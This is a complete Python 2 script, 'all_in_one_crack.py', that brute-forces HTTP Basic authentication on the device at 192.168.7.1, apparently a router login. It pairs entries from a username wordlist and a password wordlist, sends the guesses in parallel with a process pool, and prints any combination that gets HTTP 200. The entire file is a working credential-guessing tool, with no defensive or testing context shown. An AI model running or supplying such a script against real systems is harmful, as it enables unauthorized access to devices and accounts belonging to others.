#!/usr/bin/python
# coding:utf-8

# tools - all_in_one_crack.py
# 2017/12/27 19:58
# 

__author__ = 'Benny <benny@bennythink.com>'

import requests
from base64 import b64encode
from multiprocessing import Pool
from measurement import exe_time


def old_login(username, password):
    r = requests.get('http://192.168.7.1',
                     headers={'Authorization': 'Basic ' + b64encode('%s:%s' % (username, password))})
    if r.status_code == 200:
        print 'the username:password is %s:%s' % (username, password)


@exe_time
def old_crack():
    f1 = open('test_user.txt', 'r')
    f2 = open('test_pass.txt', 'r')
    p = Pool()
    while True:
        username = f1.readline()
        if len(username) == 0:
            break
        else:
            while True:
                password = f2.readline()
                if len(password) == 0:
                    f2.seek(0)
                    break
                else:
                    print 'trying `%s` and `%s`...' % (username.rstrip('\n'), password.rstrip('\n'))
                    p.apply_async(old_login, (username.rstrip('\n'), password.rstrip('\n')))

    p.close()
    p.join()
    f1.close()
    f2.close()

if __name__ == '__main__':
    print old_crack()
